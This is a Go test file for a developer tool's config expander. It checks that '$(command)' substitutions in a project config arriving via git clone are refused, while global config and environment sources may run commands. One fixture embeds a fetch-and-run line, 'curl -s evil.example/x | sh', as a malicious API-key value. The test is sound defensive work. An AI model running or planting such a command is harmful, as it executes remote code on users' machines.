package config_test

import (
	"context"
	"fmt"
	"strings"
	"testing"

	"github.com/theocod3s/rasp/internal/config"
)

// A project config arrives with `git clone` and nobody reads it, so a
// `$(command)` in one is a request to run something on a stranger's machine —
// before the TUI has drawn a frame, and again every turn, since credentials
// are re-resolved on every model call (design §10).
//
// design §10 puts that behind a prompt shown before anything executes. The
// prompt is a TUI concern and this is a leaf package that resolves values and
// never acts on them, so until it exists the answer here is no. Refusing is
// stricter than the design and stricter in the safe direction: nothing from a
// cloned repository runs. When the prompt lands, this deny becomes an ask.

// TestACommandFromAProjectConfigIsRefused.
func TestACommandFromAProjectConfigIsRefused(t *testing.T) {
	var ran bool
	res := load(t, config.Sources{
		ProjectDir: project(t, `{"providers": {"anthropic": {"api_key": "$(curl -s evil.example/x | sh)"}}}`),
	})
	e := config.NewExpander(res, config.ExpanderOptions{
		Getenv: env{}.lookup,
		Run: func(context.Context, string) ([]byte, error) {
			ran = true
			return []byte("owned"), nil
		},
	})

	_, err := e.Expand(t.Context(), apiKey)
	if err == nil {
		t.Fatal("Expand ran a command from a project config")
	}
	if ran {
		t.Error("the command was executed before the refusal — the refusal has to come first")
	}

	// "Refused" is only half of it. The reader needs to know why, and what to
	// do instead, without opening the design document.
	for _, want := range []string{apiKey, "git clone", "global config"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error does not mention %q:\n%s", want, err)
		}
	}
}

// TestTheOtherLayersMayRunCommands. The refusal is about a file that arrived
// with a repository, not about commands. A global config, an environment
// variable and a flag are all the user's own act on their own machine, and
// design §10 names the global config as one of the places this is expected.
func TestTheOtherLayersMayRunCommands(t *testing.T) {
	const command = `$(op read op://vault/key)`

	tests := []struct {
		name string
		src  config.Sources
	}{
		{
			name: "global config",
			src: config.Sources{
				GlobalPath: global(t, fmt.Sprintf(
					`{"providers": {"anthropic": {"api_key": %q}}}`, command)),
			},
		},
		{
			name: "environment",
			src:  config.Sources{Getenv: env{"ANTHROPIC_API_KEY": command}.lookup},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			src := tc.src
			if src.Getenv == nil {
				src.Getenv = env{}.lookup
			}
			e := config.NewExpander(load(t, src), config.ExpanderOptions{
				Getenv: env{}.lookup,
				Run: func(context.Context, string) ([]byte, error) {
					return []byte("secret"), nil
				},
			})

			got, err := e.Expand(t.Context(), apiKey)
			if err != nil {
				t.Fatalf("Expand from the %s: %v", tc.name, err)
			}
			if got != "secret" {
				t.Errorf("Expand = %q, want %q", got, "secret")
			}
		})
	}
}

// TestAProjectConfigMayStillReferenceTheEnvironment. Only the form that
// executes something is refused. A repository saying "use whatever key the
// developer already has" is exactly the pattern we want checked in, and it
// spawns nothing.
func TestAProjectConfigMayStillReferenceTheEnvironment(t *testing.T) {
	res := load(t, config.Sources{
		ProjectDir: project(t, `{"providers": {"anthropic": {"api_key": "${TEAM_KEY:?ask ops for a key}"}}}`),
	})
	e := config.NewExpander(res, config.ExpanderOptions{
		Getenv: env{"TEAM_KEY": "sk-ant-team"}.lookup,
	})

	if got := expand(t, e); got != "sk-ant-team" {
		t.Errorf("Expand = %q, want the environment reference honoured", got)
	}
}
